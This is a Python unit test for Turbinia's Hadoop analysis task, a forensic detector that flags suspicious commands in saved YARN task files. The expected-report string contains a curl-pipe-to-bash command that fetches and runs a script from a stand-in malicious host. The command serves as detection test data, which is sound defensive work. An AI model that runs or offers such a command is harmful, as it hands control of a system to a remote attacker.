# -*- coding: utf-8 -*-
# Copyright 2015 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Tests for hadoop."""

from __future__ import unicode_literals

import os
import unittest

from turbinia import config
from turbinia.workers import hadoop


class HadoopAnalysisTest(unittest.TestCase):
  """Tests for HadoopAnalysisTask."""

  _EXPECTED_REPORT = """Found suspicious commands!
File: /../../test_data/bad_yarn_saved_task
Command: "1533561022643*Bcurl https://evilsite2.org/aldnalezi/mygit/raw/master/ab.sh | bash0"

All strings from Yarn Tasks:
Strings for /../../test_data/bad_yarn_saved_task:
hadoop
default"
EHDTS
YARN_AM_RM_TOKEN
APPLICATION_WEB_PROXY_BASE
%/proxy/application_1526380001485_0125"
MAX_APP_ATTEMPTS
APP_SUBMIT_TIME_ENV
1533561022643*Bcurl https://evilsite2.org/aldnalezi/mygit/raw/master/ab.sh | bash0
YARNX
dr.who 
,(\x092
Application application_1526380001485_0125 failed 2 times due to AM Container for appattempt_1526380001485_0125_000002 exited with  exitCode: 0
Failing this attempt.Diagnostics: For more detailed output, check the application tracking page: http://apelcycluster-m:8088/cluster/app/application_1526380001485_0125 Then click on links to logs of each attempt.
. Failing the application.8
"""

  def setUp(self):
    self.filedir = os.path.dirname(os.path.realpath(__file__))
    self.test_file = os.path.join(
        self.filedir, '..', '..', 'test_data', 'bad_yarn_saved_task')

  def testAnalyzeHadoopAppRoot(self):
    """Tests the _AnalyzeHadoopAppRoot method."""
    config.LoadConfig()
    task = hadoop.HadoopAnalysisTask()
    self.maxDiff = None
    report = '\n'.join(task._AnalyzeHadoopAppRoot([self.test_file]))
    self.assertEqual(report.replace(self.filedir, ''), self._EXPECTED_REPORT)
